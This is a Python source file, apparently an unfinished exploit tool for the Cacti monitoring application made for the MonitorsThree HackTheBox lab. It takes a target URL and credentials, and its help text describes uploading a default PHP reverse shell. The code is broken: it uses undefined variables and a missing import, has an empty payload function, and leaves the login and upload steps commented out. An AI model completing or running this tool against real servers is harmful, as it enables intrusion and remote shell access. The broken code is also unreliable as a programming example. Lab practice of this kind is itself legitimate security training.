#!/usr/bin/env python3

'''
Author: Declan Middleton
License: MIT
github: https://github.com/declanmiddleton
linkedin: https://www.linkedin.com/in/declanmiddleton/
youtube: https://youtube.com/@declanmidd
HackTheBox: declanmiddleton

Made for MonitorsThree HTB
'''

import os
import ssl
import argparse
import urllib3
import certifi
from bs4 import BeautifulSoup

banner = '''
░▀█▀░█░█░█▀█░█▀▄░█▀█░░░░█▀▄░█▀▄░█▀█░█▀█
░░█░░█▀█░█░█░█▀▄░█░█░░░░█░█░█▀▄░█░█░█▀▀
░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░░▀▀░░▀░▀░▀▀▀░▀░░
'''
print(banner)

if __name__ == '__main__':
    cli_parser = argparse.ArgumentParser(
        epilog='''Examples:
                ./thorn.py http://localhost/cacti admin password
                ./thorn.py -p './php/rev.php' http://localhost/cacti admin password''',
        formatter_class=argparse.RawTextHelpFormatter
    )
    cli_parser.add_argument('URL',type=str,help='Cacti URL')
    cli_parser.add_argument('username',type=str,help='Login username')
    cli_parser.add_argument('password',type=str,help='Login password')
    cli_parser.add_argument('-p','--payload',type=str,help='Path to the PHP payload file (default: `./payload/shell.php` is a reverse shell created by pentestmonkey, Don\'t forget to change the ip & port)',default='./payload/shell.php')
    args = cli_parser.parse_args()

    URL = args.URL
    username = args.username
    password = args.password
    filename = args.payload

cacti_url = URL

# HTTP setup
http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs=certifi.where()
)

http_proxy = {'127.0.0.1': 8080}
session = http.request('GET', cacti_url)

def check_cacti_version(session):
    print('[+] Checking cacti version')
    resp = session.data()

    if 'Cacti CHANGELOG' in resp and '1.2.26' not in r:
        print('[+] Valid version!')
    else:
        print('[-] Invalid version, not going to work..')


def auth_login():
    print('[+] Valid version, attempting login')
    auth = urllib.request.HTTPBasicAuthHandler()
    auth.add_password(
        realm='Cacti',
        uri=cacti_url,
        user=username,
        passwd=password
    )
    opener = urllib.request.build_opener(auth)
    urllib.request.install_opener(opener)

    with urllib.request.urlopen(cacti_url) as f:
        print(f.read().decode('utf-8'))


def payload():
    pass

# check = check_cacti_version(cacti_url + "/CHANGELOG")

# if check == False:
#     sys.exit(0)
    
# if session.status == 404:
#     print('[#] Not found')    
#     sys.exit(0)
# else:
#     check_cacti_version(version_check)
    

# print('[*] Uploading payload')

# soup = BeautifulSoup(r.text)

# data = {
#     '__csrf_magic': csrf,
#     'action': 'login',
#     'login_username': username,
#     'login_password': password,
#     'remember_me': 'on'
# }
